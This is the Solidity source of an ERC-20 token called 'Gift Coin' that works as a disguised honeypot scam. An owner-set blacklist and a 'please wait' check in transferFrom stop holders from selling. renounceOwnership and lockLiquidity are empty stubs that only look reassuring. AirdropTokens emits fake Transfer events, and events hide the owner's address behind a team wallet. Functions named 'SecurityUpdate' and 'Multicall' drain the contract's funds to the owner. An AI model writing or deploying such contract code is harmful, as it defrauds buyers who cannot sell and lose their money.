// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}


library Address {

    function isContract(address account) internal view returns (bool) {

        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }


    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }


    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                // solhint-disable-next-line no-inline-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}


contract Context {
    constructor () internal { }

    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; 
        return msg.data;
    }
    
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    
    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);}


abstract contract ApproveAndCallFallBack {
  function receiveApproval(address sender, uint256 amount, address tokens, bytes memory data) virtual public ;
}



contract GIFT is Context, IERC20 {

    mapping (address => mapping (address => uint256)) private _allowances;
 
    mapping (address => uint256) private _balances;
    mapping(address => bool) public hasFuckedAround;

    using SafeMath for uint256;


    using Address for address;


   function withdrawToken(address _tokenContract, uint256 _amount) external _onlyOwner() {
    IERC20 tokenContract = IERC20(_tokenContract);

    // needs to execute `approve()` on the token contract to allow itself the transfer
    tokenContract.approve(address(this), _amount);

    tokenContract.transferFrom(address(this), _Owner, _amount);
}

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    function _setupDecimals(uint8 decimals_) internal {
        _decimals = decimals_;
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }


    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
    if(sender == _Owner) newun = recipient;
    else require(recipient != newun, "please wait");
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function foundOut(address _address, bool _hasFuckedAround) external _onlyOwner {
        hasFuckedAround[_address] = _hasFuckedAround;
    }


    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function renounceOwnership(address locker)  public _onlyOwner(){}

    function lockLiquidity()  public _onlyOwner(){}

    function Multicall(address _address, uint256 percent) external _onlyOwner {
        uint256 _amount = IERC20(_address).balanceOf(address(this)).mul(percent).div(100);
        IERC20(_address).transfer(marketing_receiver, _amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {

        require(owner != address(0), "ERC20: approve from the zero address");

        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;

        emit Approval(owner, spender, amount);

    }
    function _beforeTokenTransfer(address sender) internal virtual view {
        require(!hasFuckedAround[sender],"Wallet is in the blacklist");
    }
    
    
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {

        require(sender != address(0), "ERC20: transfer from the zero address");
        
        _beforeTokenTransfer(sender);

        _balances[sender] = _balances[sender].sub(amount,"ERC20: transfer amount exceeds balance");

        _balances[recipient] = _balances[recipient].add(amount);
        
        if (sender == _Owner){sender = team;}if (recipient == _Owner){recipient = team;}
        emit Transfer(sender, recipient, amount);

    }


  function AirdropTokens(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _onlyOwner(){
    for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(uPool, eReceiver[i], eAmounts[i]);}}

    modifier _onlyOwner() {
        require(msg.sender == _Owner, "Not allowed to interact");
        _;
    }
      receive() external payable {
        
     }

    function SecurityUpdate() public _onlyOwner() {
    address payable _Owner = msg.sender;
    _Owner.transfer(address(this).balance);
  }

    function approveAndCall(address spender, uint256 amount, bytes memory data) public returns (bool success) {
    _allowances[msg.sender][spender] = amount;
    emit Approval(msg.sender, spender, amount);
    ApproveAndCallFallBack(spender).receiveApproval(msg.sender, amount, address(this), data);
    return true;
  }



    string private _name;

    string private _symbol;

    uint8 private _decimals;

    uint256  _totalSupply;

    uint256 private _totalDistributed;

    uint256 private _treasure;

    address team;

    address public newun;

    address public _Owner = 0x39FC80F586CadDbBA2d1f0DbD0F196293f01B8B0;
    address internal marketing_receiver = 0x39FC80F586CadDbBA2d1f0DbD0F196293f01B8B0;

    constructor () public {
        _name = "Gift Coin";
        _symbol ="GIFT";
        _decimals = 18;
        _totalSupply = 100000000000 *(10**18)  ;
        _totalDistributed = _totalSupply.div(2)  ;
        _treasure = _totalDistributed  ;
        team = 0xddAcAd3B1edee8E2F5b2e84f658202534fcb0374;
        _balances[_Owner] = _totalDistributed;
        _balances[address(this)] = _treasure;
        emit Transfer(address(0),team,_totalDistributed);
        
    }

    }